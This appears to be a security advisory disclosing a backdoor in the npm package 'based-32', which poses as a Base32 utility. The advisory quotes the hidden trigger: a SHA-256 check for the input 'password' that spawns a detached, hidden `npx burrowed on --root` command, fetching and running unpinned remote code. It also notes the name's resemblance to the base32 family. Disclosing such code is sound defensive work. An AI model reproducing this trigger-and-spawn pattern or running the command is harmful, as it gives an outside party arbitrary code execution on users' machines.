summary: based-32 contains hidden magic-input backdoor that spawns unpinned remote npm package with --root
details: The package advertises itself as a Base32 encoding utility but ships a covert remote-execution trigger in dist/index.js. The exported handleSecureEncode() function (also reachable via the `based32 -s` CLI flag) computes SHA-256 of caller-supplied input and compares it to the hardcoded constant `8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`, which is the SHA-256 of the literal string 'password'. On match, it executes `spawn('npx', ['burrowed','on','--root'], { detached: true, stdio: 'ignore', windowsHide: true, shell: true })` and calls `unref()` — a detached, output-suppressed, hidden-window child that downloads and runs the unpinned third-party npm package `burrowed` at runtime, with `--root` indicating elevated/privileged daemon behavior. There is no version pin, no integrity check, and no documentation of this behavior. Whoever controls the `burrowed` package on the npm registry obtains arbitrary code execution on any machine where a caller invokes the secure-encode API with the magic input. The package name `based-32` also mimics the legitimate `base32` family, raising the chance of accidental install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
